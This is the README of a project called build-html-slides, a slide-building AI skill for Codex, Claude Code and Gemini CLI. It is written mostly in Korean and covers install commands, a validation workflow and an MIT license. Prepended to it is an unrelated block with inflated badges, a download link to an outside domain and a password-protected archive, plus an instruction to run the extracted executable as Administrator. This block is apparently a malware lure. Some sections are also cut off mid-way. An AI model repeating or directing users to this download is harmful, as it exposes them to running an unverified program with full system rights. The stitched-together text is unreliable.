<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<p align="center">
  <img src="assets/readme-hero.svg" alt="Build HTML Slides for Codex, Claude Code, and Gemini CLI" width="100%" />
</p>

<p align="center">
## 현재 상태

HTML 기반 PPT 제작 스킬을 시범적으로 개발했습니다. 발표 자료를 HTML로 구성하면 AI가 슬라이드 구조와 개별 요소에 직접 접근할 수 있어, 내용·배치·디자인을 세밀하게 수정하고 사용자의 요구사항을 구체적으로 반영하기 좋습니다.

현재는 테스트 단계이며 데스크톱 발표 환경을 우선합니다. 모바일 대응을 요청하고 별도로 검증한 덱이 아니라면 작은 화면에서 일부 요소가 정상적으로 표시되지 않을 수 있습니다.

제작 모드는 두 가지입니다.

- **빠른 제작 모드(Quick Draft)**: 전체 이야기 구조와 디자인을 먼저 완성해 바로 전달합니다. 브라우저 렌더링, 자동 검사, AI 시각 검토, 품질 점수 계산은 실행하지 않습니다.
- **정밀 검증 모드(Full Validation)**: 모든 슬라이드를 렌더링해 구성·내용·배치·이미지를 세부적으로 검토하고 보완합니다.

약 15장 분량을 기준으로 빠른 제작에는 약 10분, 정밀 검증에는 약 30~45분이 걸립니다. 이 수치는 **Codex GPT-5.6, 추론 강도 Medium**을 기준으로 한 대략적인 목표이며, 주제 조사와 이미지 탐색량, 선택한 모델, 실행 환경에 따라 달라질 수 있습니다. Quick Draft 결과에는 렌더링이나 검증 근거가 없으며, 필요하면 이후 같은 덱을 Full Validation으로 검증할 수 있습니다. 20~25장 정밀검증은 최초 `prepare`부터 45분을 목표로 하고 60분에 기계적으로 중단합니다. 시간 안에 닫히지 않은 결함은 무한 재시도하지 않고 `검증 미완료`로 보고합니다.

## 실제 생성 예시

아래 이미지는 이 스킬로 만든 HTML 프레젠테이션을 Chromium에서 직접 렌더링한 결과입니다. 홍보용 키 비주얼부터 여행·음식 에디토리얼, 스포츠 데이터, 기술 시스템 흐름까지 발표 주제에 맞춰 서로 다른 구성을 사용합니다. 각 이미지는 전체 PPT 중 일부 슬라이드만 골라 소개한 것입니다.

<table>
  <tr>
    <td width="33.33%">
      <img src="assets/showcase/blue-archive-kivotos.webp" alt="블루 아카이브 팬 창작 생태계 소개 슬라이드" />
      <br /><strong>게임 문화 · 팬 생태계</strong>
    </td>
    <td width="33.33%">
      <img src="assets/showcase/f1-strategy.webp" alt="F1 입문 가이드 표지 슬라이드" />
      <br /><strong>스포츠 입문 · 레이스 가이드</strong>
    </td>
    <td width="33.33%">
      <img src="assets/showcase/hallyu-fandom-flow.webp" alt="K-POP 팬덤 확산 구조 슬라이드" />
      <br /><strong>문화 산업 · 팬덤 흐름</strong>
    </td>
  </tr>
  <tr>
    <td width="33.33%">
      <img src="assets/showcase/world-cuisine-plate.webp" alt="한 접시에서 세계 음식의 역할을 비교하는 슬라이드" />
      <br /><strong>음식 에디토리얼 · 역할 비교</strong>
    </td>
    <td width="33.33%">
      <img src="assets/showcase/rescene-character.webp" alt="리센느 멤버 캐릭터 소개 슬라이드" />
      <br /><strong>아이돌 홍보 · 캐릭터 스토리</strong>
    </td>
    <td width="33.33%">
      <img src="assets/showcase/manosaba-trial.webp" alt="마법소녀의 마녀재판 재판 구조 슬라이드" />
      <br /><strong>게임 홍보 · 키 비주얼</strong>
    </td>
  </tr>
  <tr>
    <td width="33.33%">
      <img src="assets/showcase/car-camping-destination.webp" alt="차박 여행지 시설 정보 슬라이드" />
      <br /><strong>여행 가이드 · 목적지 정보</strong>
    </td>
    <td width="33.33%">
      <img src="assets/showcase/mars-space-garden.webp" alt="우주 식물 재배 사진을 사용한 화성 기지 운영 슬라이드" />
      <br /><strong>기술 설계 · 우주 현장</strong>
    </td>
    <td width="33.33%">
      <img src="assets/showcase/manchester-united-legacy.webp" alt="올드 트래퍼드를 배경으로 한 맨체스터 유나이티드 표지 슬라이드" />
      <br /><strong>스포츠 홍보 · 클럽 서사</strong>
    </td>
  </tr>
  <tr>
    <td width="33.33%">
      <img src="assets/showcase/bluearchive-character-showcase.webp" alt="블루 아카이브 레이사 캐릭터와 팬아트 큐레이션 슬라이드" />
      <br /><strong>게임 캐릭터 · 팬아트 큐레이션</strong>
    </td>
    <td width="33.33%">
      <img src="assets/showcase/nintendo-switch2-promo.webp" alt="닌텐도 스위치 2와 마리오 카트 월드 홍보 슬라이드" />
      <br /><strong>제품 홍보 · 게임 경험</strong>
    </td>
    <td width="33.33%">
      <img src="assets/showcase/alien-invasion-scenario.webp" alt="외계 함대가 도시 상공에 나타난 침공 시나리오 슬라이드" />
      <br /><strong>SF 시나리오 · 침공 서사</strong>
    </td>
  </tr>
</table>

게임명, 로고, 캐릭터 및 기타 제3자 자료의 권리는 각 권리자에게 있습니다. 예시 이미지는 스킬의 출력 형식과 디자인 범위를 설명하기 위해 사용합니다.

## 무엇을 만드나요?

한 번의 요청으로 다음 산출물을 함께 만듭니다.

- 오프라인에서도 열리는 단일 HTML 프레젠테이션
- 슬라이드별 발표 노트 Markdown
- 발표 없이도 각 장의 배경·작동 원리·단계별 흐름·실무 의미를 이해할 수 있는 상세 해설 Markdown
- 이미지 URL, 해시, 확인일을 보관하는 `sources.json`
- 키보드, 클릭, 페이지 번호 입력, 전체 화면을 지원하는 발표용 내비게이션
- 인쇄, 짧은 화면, 확대 환경을 고려한 반응형 무대

단순히 내용을 카드에 나누는 템플릿이 아닙니다. 발표 대상, 의사결정자, 배경지식, 반론 가능성을 바탕으로 이야기 순서를 정하고 주제에 맞는 테마와 시각 자료를 선택합니다.

## 발표자 노트 예시

HTML과 함께 생성되는 `OUTPUT-notes.md`에는 슬라이드별 목적, 실제로 읽을 수 있는 발표 멘트, 강조점, 다음 장으로 넘어가는 문장을 정리합니다. 근거가 필요한 내용에는 출처와 주의사항도 함께 남깁니다.

> **10. 자율 판단 루프**
>
> **목적:** AI를 통제되지 않은 대장으로 두지 않고 정책 가드레일 안의 판단 도구로 배치한다.
>
> **발표 멘트:** “관측, 예측, 결정, 실행, 학습이 반복되지만 전부 권한과 금지 규칙 안에서 움직입니다. 기계는 빠른 계산과 반복 복구를 맡고, 생명 위험과 비가역 조치는 사람이 결정합니다.”
>
> **전환:** “이제 실제로 펌프가 멈췄다고 가정해 보겠습니다.”

## 슬라이드 상세 해설

독자용 학습 가이드는 선택 사항입니다. 요청하면 `OUTPUT-guide.md`, 읽기 쉬운 `OUTPUT-guide.html`, `OUTPUT-guide.pdf`를 만들고 각 장의 설명 바로 위에 해당 슬라이드 캡처를 배치합니다. 가이드는 발표 대본이나 화면 문구의 반복이 아닙니다. 슬라이드에 담지 못한 배경, 중간 과정, 구성요소의 역할, 작동 원리, 실무 예시, 전제와 한계까지 보충합니다. 결론을 먼저 제시하고, 어려운 용어는 처음 나올 때 풀어 설명합니다. 긴 서론이나 반복 요약으로 분량을 늘리지 않습니다. 한국어 가이드는 완성 후 `humanize-korean`을 반드시 거칩니다.

## 주요 기능

| 영역 | 지원 내용 |
| --- | --- |
| 스토리 | 임원, 사업, 개발, 고객, 투자자 등 청중에 맞춘 정보 순서와 깊이 |
| 디자인 | 발표 목적·근거 형태·정보 밀도·감정 톤·표면·시선 초점의 6축으로 39개 테마를 의미 기반 선택하고, LLM이 주제·목적·청중·언어·근거·실제 자산을 함께 판단해 후보를 잠금. 테마·커버·타입·팔레트와 전경–배경 색상 페어를 해시 계약으로 유지하며, 1페이지 표지·글꼴·의미 있는 화면 점유율·공식 브랜드 자산·WebP 이미지·열린 레이아웃·다이어그램을 우선 검토 |
| 이미지 안전성 | 키 비주얼 잘림 방지, 왜곡 탐지, 저해상도 경고, 출처·해시 캐시, 캐릭터/인물 기준 이미지 대조 |
| 발표 경험 | 애니메이션, 직접 페이지 이동, 전체 화면, 키보드와 클릭 내비게이션 |
| 검증 | 텍스트의 부모 박스 이탈과 실제 렌더 색상 대비(일반 텍스트 4.5:1, 큰 텍스트 3:1), 반복 카드벽·대시보드 밀도, 3연속 동일 구성, 컨트롤, 이미지 geometry와 `PLACE NOTE` 같은 미완성 플레이스홀더를 자동 차단한 뒤 잠긴 디자인 준수·내용 적합성·자산 완성도·캐릭터 동일성을 포함한 AI 시각 검토 |
| 수정 속도 | 바뀐 슬라이드와 앞뒤 슬라이드만 재렌더하고 변경 유형에 맞는 검사만 실행 |

물리적 산업, 제품, 시설, 장비, 생명과학·의학 연구처럼 실제 대상을 보는 것이 이해에 중요한 주제는 표와 SVG만으로 축약하지 않습니다. 공식 기업·기관 이미지, 제품·시설 사진, 현미경·병리·의료 영상 등 주제에 맞는 시각 자료를 데이터·다이어그램과 함께 배치합니다. 반대로 추상 개념, 기밀 시스템, 이미지가 설명에 기여하지 않는 슬라이드에는 사진을 억지로 넣지 않습니다.

## 이미지 생성 도구

이미지 생성은 선택 사항입니다. Codex App 등에서 ImageGen이 제공되거나 Claude Code·Gemini CLI에 호환 이미지 생성 도구가 연결된 경우에는 분위기 이미지, 에디토리얼 일러스트, 개념 장면, 배경 제작에 활용합니다. 플랫폼 이름만 보고 생성기가 있다고 가정하지 않고 현재 세션의 실제 도구를 확인합니다.

실존 인물·그룹, 출시된 게임과 제품, 실제 장소·행사·인터페이스·연구 결과를 소개할 때는 공식 사진, 실제 스크린샷, 키 아트, 패키지, 기록 이미지 등 출처가 있는 자료를 우선합니다. ImageGen은 분위기 배경, 추상 개념, 가상 시나리오, 장식에만 사용하며 실제 대상을 대신하는 닮은꼴 이미지나 가짜 스크린샷은 만들지 않습니다. 기존 대상을 다루는 표지에도 실제 대상을 알아볼 수 있는 출처 기반 이미지가 최소 하나 들어가야 합니다.

**Claude Code 기본 설치에는 래스터 이미지 생성기가 포함되지 않습니다.** 렌더링된 이미지를 읽고 검토하는 기능과 새 이미지를 생성하는 기능은 별개입니다. Claude Code에서 생성 배경·일러스트·콘셉트 아트를 사용하려면 호환되는 이미지 생성 플러그인, MCP 서버 또는 외부 도구를 별도로 연결해야 합니다.

Gemini CLI에서도 현재 세션에 연결된 도구·확장 기능을 먼저 확인합니다. 생성기가 없으면 공식·사용자 제공·웹 조사 이미지와 HTML/CSS/SVG로 계속 작업하며, 생성 도구·인증 정보·유료 서비스를 추가하기 전에는 반드시 사용자 동의를 받습니다.

생성 도구가 없어도 공식·사용자 제공·라이선스가 확인된 이미지, 웹에서 조사한 이미지와 HTML/CSS/SVG 다이어그램으로 작업을 계속하며 브라우저 사전 검사를 실패 처리하지 않습니다. 사용자가 생성 이미지를 명시적으로 요구했는데 도구가 없다면 임의로 도구·인증 정보·유료 서비스를 설치하거나 구성하지 않고, 기존 이미지로 진행할지 생성 도구를 추가할지 먼저 확인합니다.

## 설치 전 준비

필수 도구:

## 설치

각 플랫폼에서 **플러그인과 단독 스킬 중 하나만** 선택하세요. 같은 플랫폼에 둘 다 설치하면 스킬이 중복 표시될 수 있습니다.

### AI 에이전트에게 설치를 맡긴 경우

GitHub 저장소 링크를 받은 AI 에이전트가 설치를 수행했다면, 설치 완료 응답에 다음 내용을 **반드시** 포함해야 합니다.

### 방법 A. Claude Code 플러그인

```bash
claude plugin marketplace add mclub4/build-html-ppt
claude plugin install build-html-slides@build-html-slides
```

설치 후 새 세션에서 자연어로 요청하거나 `/build-html-slides:build-html-slides`를 실행합니다. Claude 플러그인에는 독립 시각 검토자와 최종 품질 편집자 서브에이전트가 함께 포함됩니다.

### 방법 B. Codex 플러그인

```bash
codex plugin marketplace add mclub4/build-html-ppt
codex plugin add build-html-slides@build-html-slides
```

팀 배포, 버전 관리, Codex 플러그인 UI 사용에는 이 방법을 권장합니다.

### 방법 C. Gemini CLI Agent Skill

릴리스의 `.skill` 파일은 Gemini CLI가 직접 설치할 수 있는 ZIP 호환 패키지이며 `SKILL.md`가 아카이브 루트에 있습니다.

```bash
gemini skills install ./BUILD-HTML-SLIDES-GEMINI-vX.Y.Z.skill
gemini skills list
```

워크스페이스 범위가 필요하면 Gemini CLI의 `--scope workspace` 옵션을 사용합니다. 스킬은 설명과 일치하는 자연어 요청에서 활성화 동의를 거쳐 로드됩니다.

### 방법 D. 저장소에서 단독 스킬 설치

```bash
## 사용법

자연어로 부탁하거나 플랫폼별 스킬 이름을 직접 지정할 수 있습니다.

Claude Code 플러그인:

```text
/build-html-slides:build-html-slides
사업팀, 개발팀, 대표님에게 신규 결제 인프라 전환안을 설명할 발표자료를 만들어줘.
```

Claude Code 단독 스킬은 `/build-html-slides`, Codex는 `$build-html-slides`를 사용합니다. Gemini CLI에서는 발표자료 제작을 자연어로 요청하면 Agent Skill 활성화 동의가 표시되며, `/skills list`와 `/skills reload`로 상태를 확인할 수 있습니다.

```text
$build-html-slides
사업팀, 개발팀, 대표님에게 신규 결제 인프라 전환안을 설명할 발표자료를 만들어줘.
의사결정이 필요한 내용은 앞에 두고, 구현 세부사항은 뒤에 배치해줘.
```

```text
이 HTML 발표자료에서 7번 슬라이드 이미지만 교체해줘.
수정된 슬라이드만 다시 렌더링해서 잘림과 비율을 꼼꼼히 검토해줘.
```

일반 수정은 새 검증 근거가 필요한 요청이 아니라면 빠른 **Edit Only**로 처리합니다. 새 덱은 작업을 시작하기 전에 검증 모드와 선택형 독자용 학습 가이드 필요 여부를 함께 확인합니다. 사용자가 둘 중 하나를 이미 답했다면 그 질문은 반복하지 않습니다.

Quick Draft는 HTML, 발표자 노트, `sources.json`, 자산과 요청된 경우에만 학습 가이드를 만든 뒤 즉시 종료합니다. 환경 검사, 검증용 Chromium 렌더링, 자동 검증, AI 시각 검토, 품질 점수 계산을 하지 않습니다. 학습 가이드가 요청된 경우 Chromium은 슬라이드 캡처와 PDF 제작에만 사용할 수 있으며, 이는 검증이 아님을 전달할 때 명시합니다.

Full Validation을 선택한 경우에만 환경 검사를 실행합니다.

```bash
python3 codex/skills/build-html-slides/scripts/check_environment.py
# Claude 배포본에서는 .claude/skills/build-html-slides/scripts/check_environment.py
```

Python, Node.js, Playwright 또는 Chromium이 없거나 호환되지 않으면 누락 항목을 먼저 알리고 설치 여부를 묻습니다. 사용자가 동의하기 전에는 패키지 설치나 시스템 변경을 실행하지 않습니다.

동의한 뒤에는 설치된 스킬의 `scripts/install_browser_dependencies.py --consent`를 우선 사용하고 환경 검사를 다시 실행합니다. 시스템 라이브러리를 설치할 수 있는 `--with-deps`는 그 변경에도 동의한 경우에만 사용합니다.

Full Validation은 개별 스크립트를 기억해 조합하지 않고 단일 진입점으로 실행합니다. 제작 전에는 작업공간의 `drafts/research-brief.md`에 조사·출처·사용자 결정·스토리 순서를 정리하고, 최초 렌더 전에 한국어 문구·발표자 노트·슬라이드 상세 해설을 윤문합니다. 20~25장은 최초 `prepare`부터 45분을 목표로 하며 60분 하드캡을 적용합니다.

```bash
python3 codex/skills/build-html-slides/scripts/validate_all.py OUTPUT.html --mode full --review-risk standard --phase prepare
python3 codex/skills/build-html-slides/scripts/validate_all.py OUTPUT.html --phase verify
python3 codex/skills/build-html-slides/scripts/validate_all.py OUTPUT.html --phase finalize-prepare
python3 codex/skills/build-html-slides/scripts/validate_all.py OUTPUT.html --phase finalize-verify
```

증분 수정의 `--change-type`은 최적화 힌트이며 `--slides`를 생략해도 실제 지문으로 변경 장을 자동 판별합니다. 문구·이미지·슬라이드 전용 CSS는 영향받은 장만, 구조·순서·전환은 앞뒤 장까지 다시 렌더링합니다. 공통 CSS·폰트·내비게이션은 표지·고밀도 본문·선택적 마무리 2~3장을 먼저 두 번 렌더링해 결정성을 확인한 다음 전체를 한 번 렌더링합니다. 동일 소스를 다시 렌더링해 우연한 통과를 고르는 방식은 거부합니다. 최종 검토는 최대 16장씩 묶은 접촉시트로 전 장의 리듬을 빠르게 확인하고, 표준은 최대 5장, 명시적 고위험은 최대 6장만 full-size 교차검토합니다.

## 작업 파일 위치

최종 프레젠테이션 폴더에는 HTML, 발표자 노트, 슬라이드 상세 해설, `sources.json`, 실제 사용 자산만 남깁니다. 렌더 캡처, 검토 매니페스트, 문구 초안, 접촉 시트 같은 작업 파일은 덱별로 다음 경로에 모입니다.

```text
~/.codex/build-html-slides/workspaces/<덱이름>-<경로해시>/   # Codex
~/.claude/build-html-slides/workspaces/<덱이름>-<경로해시>/  # Claude Code
~/.gemini/build-html-slides/workspaces/<덱이름>-<경로해시>/ # Gemini CLI
├── review/   # Chromium 캡처와 검토 매니페스트
├── drafts/   # 문구·구성 초안
└── tmp/      # 접촉 시트와 임시 변환물
```

경로 확인과 정리:

```bash
node codex/skills/build-html-slides/scripts/render_slides.js --workspace-dir OUTPUT.html
node codex/skills/build-html-slides/scripts/render_slides.js --clean-workspace OUTPUT.html
```

같은 덱을 다시 수정할 때는 최신 검토 근거를 재사용하므로 불필요한 실행별 폴더가 쌓이지 않습니다. 작업공간 루트는 `BUILD_HTML_SLIDES_WORKSPACE_ROOT`로 변경할 수 있습니다.

## 검증과 개발

```bash
npm install
npx playwright install chromium
npm run check
npm run check:browser
npm run test:unit  # 빠른 결정적 검증
npm run test:e2e   # 실제 Chromium 렌더 파이프라인
npm test           # 전체 Python·Chromium 회귀 테스트
claude plugin validate .claude-plugin/plugin.json
claude plugin validate .claude-plugin/marketplace.json --strict
```

공통 스킬을 수정한 뒤 Codex 플러그인, Claude Code, Gemini CLI 배포본을 동기화합니다.

```bash
./scripts/sync-distributions.sh
```

플랫폼과 배포 방식을 구분한 릴리스 패키지 여섯 개를 만들 수 있습니다.

```bash
./scripts/package-release.sh
```

생성 파일:

- `BUILD-HTML-SLIDES-CODEX-SKILL-vX.Y.Z.zip`
- `BUILD-HTML-SLIDES-CODEX-PLUGIN-vX.Y.Z.zip`
- `BUILD-HTML-SLIDES-CLAUDE-SKILL-vX.Y.Z.zip`
- `BUILD-HTML-SLIDES-CLAUDE-PLUGIN-vX.Y.Z.zip`
- `BUILD-HTML-SLIDES-GEMINI-SKILL-vX.Y.Z.zip`
- `BUILD-HTML-SLIDES-GEMINI-vX.Y.Z.skill`

## 저장소 구조

```text
codex/skills/build-html-slides/             # 단독 Codex 스킬
plugins/build-html-slides/                  # Codex 플러그인
.agents/plugins/marketplace.json            # 공개 플러그인 마켓플레이스
.claude/skills/build-html-slides/            # Claude Code 스킬
.claude-plugin/                              # Claude Code 플러그인·마켓플레이스
.gemini/skills/build-html-slides/            # Gemini CLI Agent Skill
agents/                                      # Claude 독립 시각 검토 에이전트
scripts/                                    # 동기화, 검증, 릴리스 패키징
```

## 로드맵

- [x] Codex CLI / Codex App 스킬
- [x] Codex Plugin 마켓플레이스 배포
- [x] Claude Code 스킬 및 Plugin 마켓플레이스 배포
- [x] Gemini CLI Agent Skill 배포
- [ ] 더 많은 내보내기 및 협업 워크플로

지원 범위는 검증 가능한 형태로 하나씩 늘릴 예정입니다.


---

# Contributing

Issues and focused pull requests are welcome.

1. Keep the shared skill under `codex/skills/build-html-slides` as the source of truth.
2. Run `./scripts/sync-distributions.sh` after changing it; the script updates the Codex plugin and Claude skill copies.
3. Run `npm run check`, `npm run check:browser`, and `npm test` before opening a pull request.
4. Keep generated decks, browser captures, source caches, and `node_modules` out of commits.

Changes that alter validation contracts should include or update focused tests.


---

MIT License

Copyright (c) 2026 HYUNJIN CHO

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
